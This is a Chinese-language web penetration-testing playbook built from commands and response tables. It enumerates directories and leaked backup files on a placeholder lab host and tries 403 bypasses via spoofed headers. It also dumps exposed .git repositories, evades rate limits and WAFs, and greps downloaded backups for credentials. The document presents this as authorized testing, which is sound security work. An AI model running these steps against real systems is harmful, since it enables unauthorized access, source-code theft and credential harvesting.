## 目录发现与备份文件探测：命令序列 + 判定信号

授权靶场：`http://TARGET/`（自有环境，测试范围限本机靶场实例）。

**四态标签（正文）**
- 已知：本页命令语法取自 curl / ffuf / gobuster / feroxbuster 的路由帮助文本与通用 HTTP 语义；判定信号全部基于状态码、`Content-Length`、响应体哈希三类可比字段。
- 推测：`TARGET` 为常规 HTTP 服务，部署目录里可能残留打包备份与编辑器临时文件。
- 未知：`TARGET_VERSION`、真实目录树、是否存在 WAF 或软 404 —— 只有实际目标环境能定。

---

### 0. 前置：一条命令确认目标活着

```bash
curl -sS -o /dev/null -w 'code=%{http_code} size=%{size_download} time=%{time_total}\n' http://TARGET/
```
判定：`200/301/302` → 服务在，继续第 1 步；`000` 或超时 → 先换协议 `https://`、再换端口，不要往下走。
失败分支：DNS 解析失败 → 换 `/etc/hosts` 指向或直接用 IP + `Host:` 头。

```bash
command -v curl ffuf gobuster feroxbuster || true
# 缺则装（Debian/Ubuntu）：
apt-get install -y curl gobuster feroxbuster 2>/dev/null || go install github.com/ffuf/ffuf/v2@latest
ffuf -V; gobuster version; feroxbuster --version
```

### 1. 基线指纹（必做，否则后面全是误报）

软 404：任意随机路径都返回 `200` + 同一张页面。不先把它测出来，第 3、4 步的「命中」里九成是噪声。

```bash
for p in /$(openssl rand -hex 8) /no-such-path-9f8e7d /a1b2c3d4-no-such; do
  curl -sS -o /tmp/base.bin -w "code=%{http_code} size=%{size_download} ctype=%{content_type} $p\n" "http://TARGET$p"
  sha256sum /tmp/base.bin
done
```
判定：
- 三次随机路径的 `code + size + sha256` **完全一致** → 软 404，基线 = 该三元组；后续任何命中必须**不等于**它。
- `code=404` 且长度各不相同 → 硬 404，之后只看 `200/301/302/401/403`。

---

### 2. 低噪声入口（三条手工命令，先于爆破）

```bash
curl -sS -i http://TARGET/robots.txt | head -40
curl -sS -o /dev/null -w '%{http_code} %{size_download}\n' http://TARGET/sitemap.xml
curl -sS -o /dev/null -w '%{http_code} %{size_download}\n' http://TARGET/.well-known/security.txt
```
判定：`robots.txt` 返回 `200` 且体里有 `Disallow:` → 真实文件，逐行取出路径回灌字典（这些是管理员自己标出来的目录）。
失败分支：三者都等于第 1 步基线 → 无此文件，直接进第 3 步。

### 3. 目录发现（ffuf，带自动校准）

```bash
ffuf -u http://TARGET/FUZZ -w WORDLIST \
     -mc 200,204,301,302,307,401,403 \
     -ac -acc \
     -t 40 -rate 80 -timeout 10 \
     -e .php,.html,.txt,.js,.json,.zip,.bak \
     -of json -o /tmp/FILE.ffuf.json
```

| 参数 | 作用 | 判定影响 |
| --- | --- | --- |
| `-mc` | 状态码白名单 | `403` 也算命中：文件存在但被拒 |
| `-ac` / `-acc` | 自动校准软 404 指纹 | 关掉它，结果里假命中量级上升 |
| `-e` | 自动附加扩展名 | 等于把 N 条词表放大成 N×k 次请求 |
| `-t 40 -rate 80` | 并发与每秒请求上限 | 过高触发 `429/503`，见第 9 步 |

命中判定（三条同时成立才算真命中）：
1. `code` ∈ 白名单；
2. `size` ≠ 基线 `size`（或响应体 `sha256` ≠ 基线 hash）；
3. ffuf 输出的 `Words/Lines` 列与基线不同（长度被巧合相等的兜底判据）。

失败分支：
- 结果几百上千条且 `Length` 全部相同 → 软 404 未被识别，用 `-fs <该size>` 手动排除；
- 大量 `429/503` → 降 `-rate 20 -t 10`；
- 全为 `403` → 目标有统一拒绝策略，转第 6 步看绕过。

递归一层（第二层才常出 `admin/`、`api/`、`backup/`）：
```bash
ffuf -u http://TARGET/FUZZ -w WORDLIST -recursion -recursion-depth 2 -maxtime-job 90 -ac
```

### 4. 备份文件探测（扩展名矩阵）

```bash
gobuster dir -u http://TARGET -w WORDLIST \
  -x bak,old,orig,save,swp,swo,tmp,zip,tar,tar.gz,tgz,rar,7z,sql,db,sqlite,log,conf,config,ini,env,yml,yaml,json \
  -b '' -t 30 -k --timeout 10s -o /tmp/FILE.gobuster.txt
```
`-b ''` 清空默认黑名单（默认会屏蔽 `403`，那正是「存在被拒」的信号）。

判定信号：
| 观察 | 含义 | 下一步 |
| --- | --- | --- |
| `200` + `Content-Type: application/octet-stream` / `zip` / `gzip` | 二进制备份，真命中 | 第 10 步下载 |
| `200` + `text/plain` 且体里像源码 | 源码/配置泄漏，优先级最高 | 直接下载审计 |
| `200` + 与基线同 size | 软 404 假命中 | 丢弃 |
| `403` / `401` | 存在但被拒（`.htaccess`、`*.swp` 常如此） | 第 6 步 |
| `301` → `/path/` | 目录 | 进该目录重跑第 3 步 |
| `429` / `503` | 限速或 WAF | 第 9 步 |

替代实现（过滤更省事，递归更狠）：
```bash
feroxbuster -u http://TARGET -w WORDLIST -x bak old zip tar.gz sql env conf swp \
  -t 40 -L 2 -d 2 --filter-status 404 --filter-size <基线size> -o /tmp/FILE.ferox.out
```

### 5. 具名备份路径（固定清单，一条命令批量确认）

```bash
printf '%s\n' \
 /backup.zip /backups.zip /www.zip /web.zip /site.zip /html.zip /webroot.zip \
 /backup.tar.gz /backup.tar /db.sql /dump.sql /database.sql /data.sql /backup.sql \
 /config.php.bak /config.php.old /config.php~ /wp-config.php.bak /config.inc.bak \
 /.env /.env.bak /.env.old /.env.save /.env.production \
 /.git/config /.svn/entries /.hg/requires /.DS_Store \
 /index.php.bak /index.php~ /app.js.bak /application.yml.bak /docker-compose.yml.bak \
 > /tmp/FILE.backuplist.txt

while read -r p; do
  printf '%s %s\n' "$(curl -sS -o /dev/null -w '%{http_code}|%{size_download}|%{content_type}' "http://TARGET$p")" "$p"
done < /tmp/FILE.backuplist.txt
```
判定：`200` 且 `size>0` 且 `size` ≠ 基线 → 命中，立刻 `curl -o` 落盘；`200` 但 size = 基线 → 假命中；`403` → 存在被拒。

### 6. 403/401 → 拿到「存在」证据并尝试绕过

```bash
P=/config.php.bak
curl -sS -o /dev/null -w 'base   %{http_code} %{size_download}\n' "http://TARGET$P"
curl -sS -o /dev/null -w 'slash  %{http_code} %{size_download}\n' "http://TARGET$P/"
curl -sS -o /dev/null -w 'dot    %{http_code} %{size_download}\n' "http://TARGET${P}%20"
curl -sS -o /dev/null -w 'norm   %{http_code} %{size_download}\n' "http://TARGET/./$P"
curl -sS -o /dev/null -w 'xourl  %{http_code} %{size_download}\n' "http://TARGET/$P" -H "X-Original-URL: $P"
curl -sS -o /dev/null -w 'xff    %{http_code} %{size_download}\n' "http://TARGET/$P" -H "X-Forwarded-For: 127.0.0.1"
```
判定：状态码从 `403` → `200` 且 `size` 明显变化 = 规则被绕；仍 `403` 但 `size` 与基线不同 = 该路径走了独立处理分支，**本身就是存在性证据**，写进报告。

### 7. 版本控制 / 编辑器残留（一次拿源码与历史）

```bash
curl -sS -o /dev/null -w '.git/HEAD %{http_code} %{size_download}\n' http://TARGET/.git/HEAD
curl -sS http://TARGET/.git/HEAD
curl -sS -o /dev/null -w '.svn  %{http_code}\n' http://TARGET/.svn/wc.db
curl -sS -o /dev/null -w '.DS_Store %{http_code}\n' http://TARGET/.DS_Store
```
判定：`.git/HEAD` 返回 `200` 且体形如 `ref: refs/heads/<branch>` → 源码历史可拉；`.DS_Store` 返回 `200` → 用 `strings` 抽出文件名清单，回灌第 3 步字典。

```bash
pipx install git-dumper 2>/dev/null || true
git-dumper http://TARGET/.git/ /tmp/FILE.src
curl -sS -o /tmp/FILE.ds http://TARGET/.DS_Store && strings -n 4 /tmp/FILE.ds | sort -u | head -50
```

### 8. 判定信号总表

| 观察 | 含义 | 动作 |
| --- | --- | --- |
| `200` 且 size/hash 与基线不同 | 真实命中 | 下载/读取 |
| `200` 且与基线完全相同 | 软 404 假命中 | 丢弃，更新基线 |
| `403` / `401` | 存在但被拒 | 第 6 步 |
| `301/302` → 尾斜杠路径 | 目录 | 递归 |
| `200` + `application/zip`/`octet-stream` | 二进制备份 | 第 10 步 |
| `200` + 源码文本 | 源码泄漏 | 查凭据 |
| `429/503`/连接重置 | 限速或 WAF | 第 9 步 |
| `000` 全部 | 目标不可达/端口错 | 回第 0 步 |

### 9. 稳定化：并发 / 节流 / 代理池（「能打」vs「能稳定打」）

```bash
# 慢速节流：随机延迟 0.1–0.5s，先测吞吐再决定 rate
ffuf -u http://TARGET/FUZZ -w WORDLIST -t 5 -rate 20 -p 0.1-0.5 -ac
# 流量落一份到本地代理，便于回放与改包
ffuf -u http://TARGET/FUZZ -w WORDLIST -x http://127.0.0.1:8080 -replay-proxy http://127.0.0.1:8080
feroxbuster -u http://TARGET -w WORDLIST -t 10 --proxy http://127.0.0.1:8080
```
判定：大量 `429` → 降 `rate` 到 10 并加随机延迟；换出口 IP 后 `429` 消失 = IP 级限速（代理池有效）；换了 IP 仍 `429` = UA/TLS 指纹级拦截（改 UA 或走真实浏览器）。第 9 步的结论需要实际带宽/主机池才能验证。

### 10. 命中后收口：文件 → 凭据

```bash
curl -sS -o /tmp/FILE.backup.zip "http://TARGET/backup.zip"
file /tmp/FILE.backup.zip          # 期望 ZIP magic（PK 常量）；报 HTML 说明下到的是软 404 页面
unzip -l /tmp/FILE.backup.zip | head -30
grep -rniE 'password|passwd|secret|api[_-]?key|token|db_(host|user|pass)' /tmp/FILE.src 2>/dev/null | head -40
```
判定：`file` 出 `HTML document` → 回第 1 步核对基线 hash，是假命中；为真 ZIP → 解包，配置里的 DB 连接串与密钥即横向入口。

### 验证件（可跑的判定器）

```bash
python3 - /backup.zip /config.php.bak /.git/HEAD /robots.txt <<'PY'
import hashlib, random, sys, urllib.request, urllib.error
BASE = "http://TARGET"
def probe(path):
    req = urllib.request.Request(BASE + path, headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            body = r.read()
            return r.status, len(body), hashlib.sha256(body).hexdigest()[:12]
    except urllib.error.HTTPError as e:
        return e.code, int(e.headers.get("Content-Length") or 0), "-"
bases = {probe("/" + random.randbytes(8).hex()) for _ in range(3)}
print("baseline:", bases)                     # 三次随机路径指纹；不唯一说明目标在抖动
for p in sys.argv[1:]:
    sig = probe(p)
    if sig in bases:                                v = "FAKE(soft404)"
    elif sig[0] in (200, 301, 302, 401, 403):       v = "HIT"
    else:                                           v = "MISS"
    print(f"{v:14s} code={sig[0]} size={sig[1]} sha12={sig[2]} {p}")
PY
```
判据：`baseline` 集合为空或不唯一 → 目标响应不稳定，先固定 UA/关闭 CDN 再复测；逐条输出 `HIT` 的路径再回第 4/5 步用 `curl -o` 落盘核对 `file` 类型。注意 `urllib` 默认跟随重定向，`301/302` 会显示为最终页状态码，需要原始码时用 `curl -w '%{http_code}'`。
